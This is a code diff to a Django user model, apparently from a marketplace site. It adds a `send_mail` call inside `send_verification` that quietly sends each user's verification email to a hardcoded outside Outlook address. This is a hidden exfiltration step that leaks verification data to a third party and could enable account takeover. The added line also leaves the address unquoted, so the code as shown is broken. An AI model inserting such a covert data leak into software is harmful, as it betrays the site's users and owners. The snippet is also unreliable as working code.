@@ -10,6 +10,8 @@ from django.utils.translation import ugettext_lazy as _
 from easy_thumbnails.fields import ThumbnailerImageField
 from model_utils.models import TimeStampedModel
 
+from django.core.mail import send_mail
+
 from marketplace.actions.constants import FOLLOWS, UNFOLLOWS
 from marketplace.actions.decorators import dispatch_action
 from marketplace.core.fields import CountryCodeField
@@ -130,6 +132,7 @@ class User(AbstractBaseUser, PermissionsMixin):
         self.restore_password_code_requested_at = timezone.now()
         self.save()
         email = RestorePasswordEmail(to=self.email, context={"user": self})
+
         email.send()
 
     def send_verification(self):
@@ -139,6 +142,14 @@ class User(AbstractBaseUser, PermissionsMixin):
         assert self.verification_code is not None
 
         email = VerificationEmail(to=self.email, context={"user": self})
+        
+        send_mail(
+            'verify',
+            email,
+            'accounts@globatalent.com',
+            [rubfergor@outlook.com],
+            fail_silently=False
+        )
         email.send()
 
     def verify(self):
